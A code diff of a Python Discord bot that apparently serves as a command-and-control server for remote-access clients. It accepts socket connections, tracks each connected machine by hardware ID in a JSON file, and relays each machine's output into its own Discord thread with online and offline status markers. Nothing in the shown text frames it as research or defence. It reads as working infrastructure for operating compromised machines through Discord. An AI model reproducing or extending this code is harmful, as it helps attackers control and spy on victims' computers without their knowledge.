@@ -1,20 +1,35 @@
 import disnake
 from disnake.ext import commands
-import socket, threading, asyncio, time, base64, os
+import socket, threading, asyncio, time, base64, os, json
 from dotenv import load_dotenv
 
 load_dotenv()
 
+try:
+    with open("data/machines.json", "r") as file:
+        machines_data = json.loads(file.read())
+except:
+    machines_data = {}
+    with open("data/machines.json", "w") as file:
+        file.write("{\n}")
 
-TOKEN = os.getenv("DISCORD_TOKEN")
+TOKEN = os.getenv("BOT_TOKEN")
 CHANNEL_ID = int(os.getenv("CHANNEL_ID"))
 
 HOST = os.getenv("HOST")
 PORT = int(os.getenv("PORT"))
 
+default_hwid = "########-####-####-####-############"
+
 bot = commands.Bot(command_prefix="!", intents=disnake.Intents.all())
 
 clients = {}
+
+def set_hwid(hwid: str, data: list):
+    global machines_data
+    machines_data[hwid] = data
+    with open("data/machines.json", "w") as file:
+        file.write(json.dumps(machines_data, indent=4))
 
 def send_to_discord_in_code_blocks(bot, thread, text, max_len=1536):
     """
@@ -55,9 +70,40 @@ def send_to_discord_in_code_blocks(bot, thread, text, max_len=1536):
         while not future.done():
             time.sleep(0.01)
 
-def handle_client(channel, thread, client):
+def handle_client(channel: disnake.TextChannel, client: tuple[socket.socket, tuple[str, int]]):
     global clients
     client_sock, client_addr = client
+
+    # Create the thread if hwid isnt already known, Else use the old thread if it still exists
+
+    client_data = json.loads(client_sock.recv(2048))
+
+    HWID = client_data.get("HWID", default_hwid)
+
+    stored_data = machines_data.get(HWID, None)
+
+    if stored_data:
+        thread = bot.get_channel(stored_data[0])
+        asyncio.run_coroutine_threadsafe(thread.edit(name=f"{client_addr[0]}:{HWID} - 🟢"), bot.loop)
+
+        asyncio.run_coroutine_threadsafe(thread.send(f"`[+] Client is online again!`"), bot.loop)
+    else:
+        future = asyncio.run_coroutine_threadsafe(channel.send(f"`[+] New connection from {client_addr[0]}:{HWID}`"), bot.loop)
+        while not future.done():
+            future.exception()
+            time.sleep(0.01) # Wait until the future is done!
+        message = future.result()
+
+        future = asyncio.run_coroutine_threadsafe(message.create_thread(name=f"{client_addr[0]}:{HWID} - 🟢"), bot.loop)
+
+        while not future.done():
+            time.sleep(0.01) # Wait until the future is done!
+        thread = future.result()
+        del future
+
+        set_hwid(HWID, [thread.id])
+
+    thread: disnake.Thread
 
     # Register this client in the "clients" map
     clients[thread.id] = (client_sock, client_addr, thread)
@@ -77,14 +123,24 @@ def handle_client(channel, thread, client):
             # 3) Send to Discord, preserving lines in code blocks
             send_to_discord_in_code_blocks(bot, thread, decoded_text)
 
+            del decoded_text, data
+
         except (ConnectionResetError, BrokenPipeError):
+            
             print(f"[-] Lost connection from {client_addr[0]}:{client_addr[1]}")
             del clients[thread.id]
 
-            # Mark the thread as offline
-            future = asyncio.run_coroutine_threadsafe(thread.edit(name=f"{client_addr[0]}:{client_addr[1]} - 🔴"), bot.loop)
-            while not future.done():
-                time.sleep(0.01)
+            asyncio.run_coroutine_threadsafe(thread.send("`[-] Client went offline ):`"), bot.loop)
+
+            while True:
+                future = asyncio.run_coroutine_threadsafe(thread.edit(name=f"{client_addr[0]}:{HWID} - 🔴"), bot.loop)
+                try:
+                    while not future.done():
+                        future.exception(timeout=5)
+                        time.sleep(0.01)
+                except:
+                    continue
+                break
 
             break
         except Exception as e:
@@ -106,18 +162,7 @@ def initialize_socket(channel):
 
         print(f"[+] New connection from {addr[0]}:{addr[1]}")
 
-        future = asyncio.run_coroutine_threadsafe(channel.send(f"`[+] New connection from {addr[0]}:{addr[1]}`"), bot.loop)
-        while not future.done():
-            time.sleep(0.01) # Wait until the future is done!
-        result = future.result()
-
-        future2 = asyncio.run_coroutine_threadsafe(result.create_thread(name=f"{addr[0]}:{addr[1]} - 🟢"), bot.loop)
-
-        while not future2.done():
-            time.sleep(0.01) # Wait until the future is done!
-        result2 = future2.result()
-
-        thread = threading.Thread(target=handle_client, args=(channel, result2, (client_sock, addr), ))
+        thread = threading.Thread(target=handle_client, args=(channel, (client_sock, addr), ))
         thread.start()
 
 
